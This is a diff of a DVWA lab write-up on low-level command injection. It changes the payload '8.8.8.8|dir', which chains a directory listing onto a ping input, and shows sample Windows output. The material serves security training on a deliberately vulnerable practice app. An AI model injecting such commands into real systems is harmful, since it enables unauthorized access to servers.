@@ -1,29 +1,31 @@
 # Command Injection - Low 
 
-## Attack Steps 
+## Attack Steps
 
-1. Navigate to the DVWA Command Injection page:
-    
-    - http://<ip address>/dvwa/vulnerabilities/exec
+1. **Open the DVWA Command Injection page**  
+   Navigate to:
+http://localhost/dvwa/vulnerabilities/exec
  
-2. In the input field, enter the following payload:  
-
-    ```bash
-    8.8.8.8|ls
-    ```
+2. **Enter the payload** in the input field:  
+```bash
+8.8.8.8|dir
+```
 
 
 3. Click the **Submit** button.
 
-4. The output should display the ping results followed by the directory listing from the server, for example:  
+4. Observe the output You should see the ping results followed by the directory listing from the DVWA server, for example:
 
     ```bash 
-    help
-    index.php
-    source
+    Volume in drive C has no label.
+    Volume Serial Number is XXXX-XXXX
+
+    Directory of C:\xampp\htdocs\DVWA\vulnerabilities\exec
+
+    01/01/2025  10:00 AM    <DIR>          .
+    01/01/2025  10:00 AM    <DIR>          ..
+               0 File(s)              0 bytes
     ```
-
-
 
 ## Vulnerable Code Analysis
 
